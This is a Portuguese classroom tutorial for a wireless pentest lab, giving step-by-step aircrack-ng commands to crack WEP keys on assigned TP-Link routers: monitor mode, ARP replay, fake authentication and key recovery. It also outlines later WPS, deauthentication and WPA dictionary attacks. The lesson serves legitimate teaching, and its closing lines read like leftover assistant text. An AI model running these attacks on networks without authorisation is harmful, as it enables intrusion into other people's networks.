# 📡 Aula 06 — Testes de Invasão Wireless: Quebra de Senha WEP com Kali Linux

> **Módulo:** Redes Sem-Fio — Testes de Invasão (Pentest Wireless)
> **Aula:** 06 — Habilitação da Antena, Modo Monitor e Quebra de Senha WEP
> **Equipamentos homologados:** TP-Link Archer C50 (W) e TP-Link Archer EC220-G5 (configurados em **WEP** pelos alunos)
> **Estação de ataque:** Kali Linux + placa de rede wireless compatível com modo monitor/injeção
---

## ℹ️ Informações do Documento

| Campo | Descrição |
|-------|-----------|
| **Autor** | Robson Vaamonde |
| **Data de criação** | 22/07/2026 |
| **Data de atualização** | 19/08/2026 |
| **Versão** | 0.04 |
| **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
---

### 🔗 Links do Autor

| Canal | Link |
|-------|------|
| Procedimentos em TI | http://procedimentosemti.com.br |
| Bora para Prática | http://boraparapratica.com.br |
| Site pessoal | http://vaamonde.com.br |
| Facebook — Procedimentos em TI | https://www.facebook.com/ProcedimentosEmTi |
| Facebook — Bora para Prática | https://www.facebook.com/BoraParaPratica |
| Instagram — Procedimentos em TI | https://www.instagram.com/procedimentoem |
| YouTube — Bora para Prática | https://www.youtube.com/boraparapratica |
| LinkedIn — Robson Vaamonde | https://www.linkedin.com/in/robson-vaamonde-0b029028/ |
| GitHub — Procedimentos em TI | https://github.com/vaamonde |
---

## ⚠️ Aviso Legal e Ético — Leia Antes de Iniciar

> Este material é destinado **exclusivamente a fins didáticos**, em **ambiente de rede controlada e isolada** (laboratório), com equipamentos de propriedade da instituição de ensino e consentimento expresso para os testes.
>
> A utilização das técnicas aqui descritas contra redes de terceiros, sem autorização formal, configura crime previsto no **Código Penal Brasileiro** __`(arts. 154-A e 154-B — invasão de dispositivo informático; art. 266 — interrupção de serviço telemático; arts. 155 e 157 — subtração de coisa alheia)`__, além de responsabilidade civil __`(Código Civil, arts. 927 a 943)`__.
>
> Cada grupo deve atacar **somente** o Access Point que lhe foi atribuído no laboratório.
---

## 📑 Sumário

1. [Preparação do Ambiente e da Antena](#01---preparação-do-ambiente-e-da-antena)
2. [Habilitando o Modo Monitor](#02---habilitando-o-modo-monitor)
3. [Reconhecimento das Redes (Wardriving Local)](#03---reconhecimento-das-redes-wardriving-local)
4. [Captura Direcionada de Pacotes](#04---captura-direcionada-de-pacotes)
5. [Geração de Tráfego — Ataque ARP Replay](#05---geração-de-tráfego--ataque-arp-replay)
6. [Quebra da Chave WEP com Criptoanálise](#06---quebra-da-chave-wep-com-criptoanálise)
7. [Validação e Preenchimento do Relatório](#07---validação-e-preenchimento-do-relatório)
8. [Roteiro das Próximas Aulas — WPA / WPA2 / WPA3 / WPS](#-roteiro-das-próximas-aulas--wpa--wpa2--wpa3--wps)
---

## 01 - Preparação do Ambiente e da Antena e dos Roteadores Alvos com WEP

```bash
# Criando a Chave WEP de 64 bits (40 bits secretos) — 10 caracteres hex
# opções do comando openssl: rand (Generate pseudo-random bytes), -hex (Hexadecimal Output)
openssl rand -hex 5

# Criando a Chave WEP de 128 bits (104 bits secretos) — 26 caracteres hex
# opções do comando openssl: rand (Generate pseudo-random bytes), -hex (Hexadecimal Output)
openssl rand -hex 13

# Criando a Chave WEP de 152 bits (128 bits secretos) — 32 caracteres hex
# opções do comando openssl: rand (Generate pseudo-random bytes), -hex (Hexadecimal Output)
openssl rand -hex 16
```

| Passo | Ação |
|-------|------|
| 1 | Conectar a placa/antena wireless externa (ex.: Alfa AWUS036ACH ou similar) compatível com **modo monitor e injeção de pacotes** na porta USB da estação Kali Linux. |
| 2 | Verificar se a placa foi reconhecida pelo sistema. |
| 3 | Posicionar a antena próxima ao AP do grupo, evitando interferência de outros grupos no mesmo laboratório. |
---

```bash
# Verificando se a interface wireless foi reconhecida no Linux
sudo iwconfig

# Verificando detalhes da placa de rede sem-fio (fabricante/chipset)
sudo lsusb
```

| Campo | Valor esperado | Descrição |
|-------|----------------|-----------|
| **Interface** | `wlan0` (ou `wlan1`) | Nome da interface de rede sem-fio reconhecida pelo Kali. |
| **Chipset compatível** | `Atheros, Realtek RTL88xx, Ralink` | Chipsets recomendados por suportarem modo monitor e injeção de pacotes nativamente no aircrack-ng suite. |
---

> ⚠️ **Atenção:** nem toda placa Wi-Fi interna de notebook suporta injeção de pacotes. Recomenda-se sempre uma antena USB externa homologada para pentest.

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | Comando `iwconfig` lista a interface `wlan0` sem erros. |
| 2 | Comando `lsusb` reconhece o chipset da antena externa. |
---

## 02 - Habilitando o Modo Monitor

| Passo | Ação |
|-------|------|
| 1 | Encerrar processos que possam interferir na captura (`NetworkManager`, `wpa_supplicant`). |
| 2 | Colocar a interface em modo monitor com o **airmon-ng**. |
---

```bash
# Verificar o status de processos de gerenciamento da Rede Sem-Fio
# opção do comando airmon-ng: check (List all possible programs that could interfere with the wireless card)
sudo airmon-ng check

# Finalizando os processos de gerenciamento da Rede Sem-Fio
# opções do comando airmon-ng: check (List all possible programs that could interfere with the wireless card), 
# kill (If 'kill' is specified, it will try to kill all of them)
sudo airmon-ng check kill

# Habilitar o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
# opção do comando airmon-ng: start (Enable  monitor  mode on an interface (and specify a channel))
sudo airmon-ng start wlan1

# Verificando o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
sudo iwconfig
```

Isso cria a interface virtual **`wlan1`**, usada em todos os passos seguintes.

| Campo | Descrição |
|-------|-----------|
| `wlan1` | Interface virtual em modo monitor, capaz de capturar todos os quadros 802.11 no ar (Beacon Frames, Probe Requests, Data), independentemente de estarem endereçados à sua placa. |
---

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | `iwconfig` exibe `wlan1` com **Mode:Monitor**. |
| 2 | Nenhum processo do NetworkManager reaparece interferindo na interface (checar com `airmon-ng check`). |
---

## 03 - Reconhecimento das Redes (Wardriving Local)

| Passo | Ação |
|-------|------|
| 1 | Rodar o **airodump-ng** sem filtro para identificar o BSSID, canal e tipo de criptografia do AP do grupo. |
---

```bash
# Escaneamento da rede utilizando o Airodump-NG em busca de Access Point e End Points
sudo airodump-ng wlan1
```

| Campo | Descrição |
|-------|-----------|
| **BSSID** | Endereço MAC do Access Point — identificador único necessário para os próximos comandos. |
| **CH** | Canal em que o AP está operando (ex.: 1, 6, 11 em 2.4 GHz). |
| **ENC / CIPHER / AUTH** | Tipo de criptografia detectado — deve aparecer como **`WEP`** para este roteiro. |
| **ESSID** | Nome da rede (SSID) configurado pelo grupo (ex.: `grupo-0x-2.4`). |
| **STATION** | Endereço MAC de clientes já conectados ao AP — útil para o ataque de geração de tráfego. |
---

➡️ Anotar em uma planilha/relatório: `BSSID`, `Canal` e pelo menos um `STATION` (se houver cliente associado).

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | O AP do grupo aparece na varredura com **ENC = WEP**. |
| 2 | BSSID e canal do AP foram anotados corretamente. |
---

## 04 - Captura Direcionada de Pacotes

Com o BSSID e o canal identificados, fixar a captura apenas no AP-alvo e gravar os pacotes em arquivo (necessário para a criptoanálise posterior).

```bash
# Focar a captura em um único AP/canal para observar as informações de Beacons e Data Sources
# opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only
# show networks, matching the given bssid), -w (Is  the  dump  file prefix to use)
sudo airodump-ng -c <CANAL> --bssid <BSSID_DO_AP_WEP> -w chavewep wlan1
```

| Parâmetro | Descrição |
|-----------|-----------|
| `-c` | Fixa a captura no canal específico do AP-alvo, evitando ruído de outras redes/canais. |
| `--bssid` | Filtra a captura apenas para o BSSID informado, ignorando tráfego de outros APs. |
| `-w chavewep` | Define o prefixo dos arquivos de captura gravados em disco (ex.: `chavewep-01.cap`), que serão usados posteriormente pelo aircrack-ng. |
---

➡️ **Deixe esse terminal aberto e rodando** — ele acompanha em tempo real o campo **`#Data`** (quantidade de pacotes/IVs capturados), que precisa crescer rapidamente no próximo passo.

> 💡 **Meta:** para WEP, normalmente **10.000 a 30.000 IVs (Data)** já são suficientes para a quebra da chave via criptoanálise estatística (dependendo do tamanho da chave, 64 ou 128 bits).
---

## 05 - Geração de Tráfego — Ataque ARP Replay

Em redes ociosas, o número de pacotes cresce muito devagar. Para acelerar a coleta de vetores de inicialização (IVs), utiliza-se o **aireplay-ng** para reinjetar requisições ARP capturadas, forçando o AP a gerar novos pacotes criptografados continuamente.

| Passo | Ação |
|-------|------|
| 1 | Abrir um **segundo terminal**, mantendo o `airodump-ng` do passo anterior em execução. |
| 2 | Rodar o ataque de reinjeção ARP (tipo `-3`). |
---

```bash
# Focar a captura em um único AP/canal para observar as informações de Beacons e Data Sources
# opções do comando aireplay-ng: -3 (The classic ARP request replay attack is the most effective way 
# to generate new initialization vectors (IVs), and works very reliably.), -b (MAC address of access
# point), -h (Set source MAC address)
sudo aireplay-ng -3 -b <BSSID_DO_AP> -h <MAC_DO_CLIENTE_STATION> wlan1
```

| Parâmetro | Descrição |
|-----------|-----------|
| `-3` | Tipo de ataque: **ARP Request Replay** — captura um pacote ARP e o reinjeta repetidamente na rede. |
| `-b` | Endereço MAC (BSSID) do roteador-alvo. |
| `-h` | Endereço MAC de um cliente (Station) associado ao AP, capturado na varredura do passo 03 — necessário para forjar os pacotes com um MAC de origem "válido" para o AP. |
| `wlan1` | Interface em modo monitor usada para a injeção. |
---

⚠️ **Sem cliente associado (STATION vazio)?** Utilize primeiro um ataque de autenticação falsa para se associar ao AP antes da reinjeção: `-1` realiza uma autenticação falsa (*fake authentication*), permitindo que a própria placa atacante seja aceita como cliente pelo AP mesmo sem conhecer a senha.

```bash
# Verificando o endereço MAC Address da Placa de Rede Sem-Fio em Modo Monitor
# opção do comando macchanger: -s (Prints the current MAC)
sudo macchanger -s wlan1

# Forçando uma associação falsa (Fake Authentication) no Access Point Alvo
# opções do comando aireplay-ng: -1 (The fake authentication attack allows you to perform the two types
# of WEP authentication (Open System and Shared Key) plus  associate  with the access point (AP).), 
# -a (Set Access Point MAC address), -h (Set source MAC address)
sudo aireplay-ng -1 0 -a <BSSID_DO_AP> -h <MAC_DA_SUA_PLACA_DE_REDE_SEM-FIO> wlan1
```

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | No terminal do `airodump-ng`, o campo **`#Data`** passa a crescer rapidamente (centenas/milhares de pacotes por minuto). |
| 2 | O terminal do `aireplay-ng` exibe contagem crescente de **ARP requests enviados/recebidos**. |
---

➡️ Aguardar até o `#Data` atingir a meta definida no passo 04 (ex.: 20.000+), depois encerrar **ambos** os terminais com `Ctrl+C`.
---

## 06 - Quebra da Chave WEP com Criptoanálise

Com os pacotes suficientes capturados no arquivo `.cap`, aplica-se o método estatístico de criptoanálise (ataque PTW/FMS) do **aircrack-ng** — diferente do WPA/WPA2, o WEP **não depende de dicionário**, e sim da quantidade de IVs (Initialization Vector - Vetor de Inicialização) coletados.

```bash
# Forçando uma quebra de senha WEP do Access Point utilizando o Dump das chaves capturadas
# opções do comando aircrack-ng: -b (MAC address of access point)
sudo aircrack-ng -b <BSSID_DO_AP> chavewep-01.cap
```

| Parâmetro | Descrição |
|-----------|-----------|
| `-b` | Filtra a análise apenas para o BSSID do AP-alvo, caso o arquivo `.cap` contenha pacotes de mais de uma rede. |
| `chavewep-01.cap` | Arquivo de captura gerado pelo `airodump-ng` no passo 04 (o sufixo numérico é criado automaticamente). |
---

### ✅ Resultado Esperado

| Situação | Ação |
|----------|------|
| ✅ `KEY FOUND! [ XX:XX:XX:XX:XX ]` | Chave WEP quebrada com sucesso — anotar a senha encontrada (em hexadecimal ou ASCII) no relatório do grupo. |
| ❌ Falha (poucos IVs) | Retornar ao passo 05 e continuar a reinjeção ARP até acumular mais pacotes, depois repetir o `aircrack-ng`. |
---

> 💡 **Dica:** o `aircrack-ng` pode ser executado **em paralelo**, em um terceiro terminal, enquanto a captura/reinjeção continua rodando — ele tenta a quebra a cada novo lote de IVs, sem precisar parar a captura.
---

## 07 - Validação e Preenchimento do Relatório

### ✅ Testes de Validação Final

| # | Teste |
|---|-------|
| 1 | Conectar um dispositivo à rede WEP do grupo usando a senha encontrada, confirmando o acesso. |
| 2 | Registrar no relatório: BSSID, ESSID, canal, quantidade de IVs necessária e tempo total do ataque. |
| 3 | Comparar o tempo de quebra do WEP com o tempo estimado para WPA2 (próxima aula), discutindo em grupo por que o WEP é considerado obsoleto. |
---

## ✅ Checklist Final da Aula

- [ ] Antena externa reconhecida e modo monitor habilitado (`wlan1`)
- [ ] AP do grupo identificado (BSSID, canal, ESSID) com criptografia WEP confirmada
- [ ] Captura direcionada iniciada (`airodump-ng -w chavewep`)
- [ ] Tráfego ARP reinjetado (`aireplay-ng -3`) ou autenticação falsa aplicada quando necessário
- [ ] IVs suficientes coletados (`#Data` ≥ meta definida)
- [ ] Chave WEP quebrada com `aircrack-ng`
- [ ] Conexão validada com a senha descoberta
- [ ] Relatório do grupo preenchido com BSSID, senha e tempo de ataque
---

## 🗺️ Roteiro das Próximas Aulas — WPA / WPA2 / WPA3 / WPS

Estrutura sugerida para a continuidade do módulo, seguindo a mesma progressão didática (reconhecimento → captura → ataque → criptoanálise → validação):

| Aula | Protocolo | Técnica principal | Ferramentas |
|---|---|---|---|
| **07** | WPS | Enumeração de APs com WPS ativo e ataque de PIN | `wash -i wlan1 -s`, `airodump-ng --wps`, `reaver -i wlan1 -b <BSSID> -K 1 -vv`, variação com `-d 302` para evitar bloqueio (*lockout*), `pixiewps` |
| **08** | WPA / WPA2-Personal | Captura de **4-way handshake** (passiva ou via desautenticação ativa) + ataque de **força bruta por dicionário** (não há atalho estatístico como no WEP) | `airmon-ng`, `airodump-ng`, `aireplay-ng -0` (deauth), `aircrack-ng -w wordlist.txt`, opcionalmente `hashcat`/`pyrit` (GPU) |
| **09** | WPA3-Personal (SAE) | Explicar por que o handshake tradicional **não é suficiente** contra SAE/Dragonfly (resistente a ataques offline de dicionário); abordar vetores residuais (downgrade para WPA2 em modo misto, side-channel) | Discussão teórica + testes em modo misto WPA2/WPA3 |
---

> 💡 **Observação didática importante:** diferente do WEP (quebrável por criptoanálise pura dos IVs), o ataque a WPA/WPA2 depende **inteiramente de um bom dicionário de senhas** — sem ele, o `aircrack-ng` não consegue recuperar a chave, mesmo capturando o handshake perfeitamente. Isso deve ser destacado aos alunos como a principal diferença conceitual entre os dois módulos.

> 📌 **Sobre o banco de dados de senhas sorteadas:** assim que você fornecer o arquivo com as senhas por grupo, posso ajudar a estruturar um dicionário (`wordlist`) personalizado por grupo/turma para uso nas Aulas 07-09, compatível com o formato esperado pelo `aircrack-ng -w`.

> 📌 **Próxima aula:** Aula 07 — Captura de handshake e quebra de senha WPA/WPA2 via dicionário.